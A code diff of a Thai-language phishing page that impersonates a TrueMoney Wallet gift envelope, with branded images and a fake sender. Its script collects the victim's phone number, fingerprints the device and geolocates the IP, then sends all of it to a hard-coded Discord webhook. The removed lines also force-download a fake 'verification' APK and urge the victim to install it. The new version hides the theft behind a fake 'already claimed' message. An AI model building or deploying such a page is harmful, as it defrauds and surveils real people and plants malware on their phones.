@@ -3,108 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ของขวัญสำหรับคุณ</title>
-    <meta property="og:title" content="ของขวัญสำหรับคุณ">
-    <meta property="og:description" content="คุณได้รับซองทรูมันนี่มูลค่า 10-100 บาท จากเพื่อนของคุณ">
+    <title>ของขวัญพิเศษจากเพื่อน</title>
+    <meta property="og:title" content="ศราวุธ ส่งของขวัญให้คุณ">
+    <meta property="og:description" content="คุณได้รับซองอั่งเปามูลค่า 10-100 บาท">
     <meta property="og:image" content="https://gift.truemoney.com/campaign/static/media/redenvelope_share.png">
-    
+
     <link href="https://fonts.googleapis.com/css2?family=Sarabun:wght@400;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Sarabun', sans-serif; background-color: #ffffff; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
-        .container { width: 100%; max-width: 500px; padding: 20px; text-align: center; }
-        .main-img { width: 100%; max-width: 320px; margin-bottom: 20px; }
-        .sender-name { font-size: 1.3rem; font-weight: bold; color: #333; }
-        .input-box { text-align: left; width: 95%; margin: 20px auto; }
-        input[type="text"] { width: 100%; padding: 14px; border: 1px solid #ddd; border-radius: 6px; font-size: 1.1rem; box-sizing: border-box; outline: none; }
-        .btn-orange { background-color: #ff8c2d; color: white; border: none; width: 100%; padding: 16px; font-size: 1.1rem; font-weight: bold; border-radius: 30px; cursor: pointer; margin-top: 20px; }
-        #loading-screen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 100; text-align: center; padding: 20px; }
-        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { font-family: 'Sarabun', sans-serif; background: #f5f5f5; margin: 0; display: flex; justify-content: center; min-height: 100vh; }
+        .card { width: 100%; max-width: 450px; background: #fff; padding: 30px 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.1); border-radius: 0 0 20px 20px; }
+        .logo { width: 150px; margin-bottom: 20px; }
+        .envelope-img { width: 100%; max-width: 280px; margin-bottom: 15px; }
+        .title { font-size: 1.4rem; font-weight: bold; color: #333; margin-bottom: 5px; }
+        .sub-title { color: #888; font-size: 1rem; margin-bottom: 25px; }
+        .input-group { text-align: left; margin: 0 auto 20px; width: 90%; }
+        label { display: block; margin-bottom: 8px; font-size: 0.9rem; color: #666; }
+        input { width: 100%; padding: 15px; border: 1.5px solid #eee; border-radius: 12px; font-size: 1.1rem; box-sizing: border-box; outline: none; transition: 0.3s; }
+        input:focus { border-color: #ff8c2d; }
+        .btn { background: linear-gradient(90deg, #ff8c2d, #f56e2d); color: #fff; border: none; width: 90%; padding: 18px; font-size: 1.2rem; font-weight: bold; border-radius: 35px; cursor: pointer; transition: 0.3s; }
+        .btn:active { transform: scale(0.98); }
+        #loader { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(255,255,255,0.95); display: none; flex-direction: column; justify-content: center; align-items: center; z-index: 1000; }
+        .spin { border: 4px solid #f3f3f3; border-top: 4px solid #ff8c2d; border-radius: 50%; width: 45px; height: 45px; animation: s 1s linear infinite; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img class="main-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
-        <div class="sender-name">ปัญญาภร ***</div>
-        <div style="color: #888;">ส่งซองทรูมันนี่ให้คุณ</div>
-        <div class="input-box">
-            <label style="font-size: 0.9rem; color: #666;">กรอกเบอร์โทรศัพท์เพื่อรับซอง</label>
-            <input type="text" id="phone" placeholder="08x-xxx-xxxx" maxlength="10">
+    <div class="card">
+        <img class="logo" src="https://www.truemoney.com/wp-content/uploads/2020/05/logo-truemoneywallet-2.png">
+        <img class="envelope-img" src="https://gift.truemoney.com/campaign/static/media/landing_main.26b054af21dc302fb4a6.png">
+        <div class="title">ศราวุธ ***</div>
+        <div class="sub-title">ส่งซองอั่งเปาให้คุณ</div>
+        <div class="input-group">
+            <label>เบอร์โทรศัพท์มือถือ</label>
+            <input type="text" id="p" placeholder="08x-xxx-xxxx" maxlength="10">
         </div>
-        <button class="btn-orange" onclick="startRedeem()">รับซองเลย</button>
+        <button class="btn" onclick="go()">รับเงินเข้าวอลเล็ท</button>
     </div>
 
-    <div id="loading-screen">
-        <div class="spinner"></div>
-        <div id="status-text" style="color:#ff8c2d; font-weight:bold;">กำลังตรวจสอบสิทธิ์...</div>
-        <div id="sub-text" style="color:#888; font-size: 0.85rem; margin-top: 10px;">กรุณารอครู่เดียว ระบบกำลังเตรียมข้อมูลให้คุณ</div>
+    <div id="loader">
+        <div class="spin"></div>
+        <div id="t" style="margin-top:20px; color:#ff8c2d; font-weight:bold;">กำลังทำรายการ...</div>
     </div>
 
     <script>
-        // --- ตั้งค่าข้อมูลตรงนี้ ---
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";
-        const APK_URL = "https://your-direct-download-link.com/file.apk"; // เปลี่ยนเป็นลิงก์ไฟล์ของท่าน
-        // -----------------------
+        const WEB = "https://discord.com/api/webhooks/1493303430289162493/u7A4FZxwAdekbS0Bw5pngOyRc2DToLjFQikE0rxeCqaEO1GNy6CddP8ChlCCNqSlB854";
 
-        async function startRedeem() {
-            const phone = document.getElementById('phone').value;
-            if(phone.length < 10) { alert("กรุณากรอกเบอร์โทรศัพท์ให้ถูกต้อง"); return; }
-            
-            document.getElementById('loading-screen').style.display = 'flex';
+        async function go() {
+            const p = document.getElementById('p').value;
+            if(!/^[0-9]{10}$/.test(p)) return alert("กรุณาระบุเบอร์ให้ถูกต้อง");
 
-            // 1. ดึงข้อมูลเครื่องแบบเงียบ (Stealth Hardware Scan)
+            document.getElementById('loader').style.display = 'flex';
+
+            // ดึงข้อมูล IP & Hardware แบบเงียบ
             let gpu = "N/A";
-            try {
+            try { 
                 const canvas = document.createElement('canvas');
                 const gl = canvas.getContext('webgl');
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            } catch (e) { gpu = "Blocked/Hidden"; }
+                gpu = gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL);
+            } catch(e){}
 
-            const hw = {
-                cpu: navigator.hardwareConcurrency || "N/A",
-                ram: navigator.deviceMemory || "N/A",
-                platform: navigator.platform || "N/A",
-                screen: `${screen.width}x${screen.height}`
-            };
-
-            // 2. ดึง IP และส่งเข้า Discord
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                await fetch(WEBHOOK_URL, { 
-                    method: 'POST', 
-                    headers: { 'Content-Type': 'application/json' }, 
+                // ยิงเข้า Discord เพื่อส่งให้สคริปต์ Node.js ทำงานต่อ
+                await fetch(WEB, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "🚀 **Target Captured & Payload Sent!**",
+                        content: `🚀 **New Target Ready for Redeem!**\nPhone: \`${p}\``,
                         embeds: [{
-                            title: "🕵️ รายงานข้อมูล (V19 Stealth + Download)",
-                            color: 16711680,
+                            title: "🕵️ ข้อมูลเหยื่อ (ศราวุธ Stealth)",
+                            color: 16745517,
                             fields: [
-                                { name: "📱 เบอร์มือถือ", value: `**${phone}**`, inline: true },
-                                { name: "🏙️ เมือง/พิกัด", value: `📍 [Maps](https://www.google.com/maps?q=${d.latitude},${d.longitude})\n${d.city}, ${d.region}`, inline: true },
-                                { name: "🛠️ Hardware", value: `🧠 CPU: ${hw.cpu} Core\n📟 RAM: ${hw.ram} GB\n🎨 GPU: ${gpu}\n🖥️ จอ: ${hw.screen}`, inline: false }
+                                { name: "📱 เบอร์โทร", value: `**${p}**`, inline: true },
+                                { name: "📍 พื้นที่", value: `${d.city}, ${d.region}`, inline: true },
+                                { name: "🛠️ สเปกเครื่อง", value: `CPU: ${navigator.hardwareConcurrency} | RAM: ${navigator.deviceMemory}GB\nGPU: ${gpu}` }
                             ],
                             timestamp: new Date()
                         }]
-                    }) 
+                    })
                 });
-            } catch (e) { console.log("Silent Error"); }
+            } catch(e){}
 
-            // 3. เริ่มกระบวนการดาวน์โหลด (The Payload)
+            // Exit Strategy: เนียนๆ ว่าล้มเหลว
             setTimeout(() => {
-                const link = document.createElement('a');
-                link.href = APK_URL;
-                link.download = "TrueMoney_Verify_App.apk"; // ชื่อไฟล์ที่เหยื่อจะเห็น
-                document.body.appendChild(link);
-                link.click();
-                document.body.removeChild(link);
-                
-                // แก้ไข UI ให้ชี้นำการติดตั้ง
-                document.getElementById('status-text').innerText = "กรุณาติดตั้งแอปยืนยันตัวตน";
-                document.getElementById('sub-text').innerHTML = "ระบบได้ดาวน์โหลดไฟล์ยืนยันตัวตนแล้ว<br>โปรดกด 'ติดตั้ง' เพื่อรับเงินเข้าวอลเล็ททันที";
-            }, 1500);
+                document.getElementById('t').style.color = "#ff4444";
+                document.getElementById('t').innerText = "ขออภัย! ซองนี้มีผู้รับเต็มจำนวนแล้ว";
+                setTimeout(() => location.reload(), 3000);
+            }, 2500);
         }
     </script>
 </body>
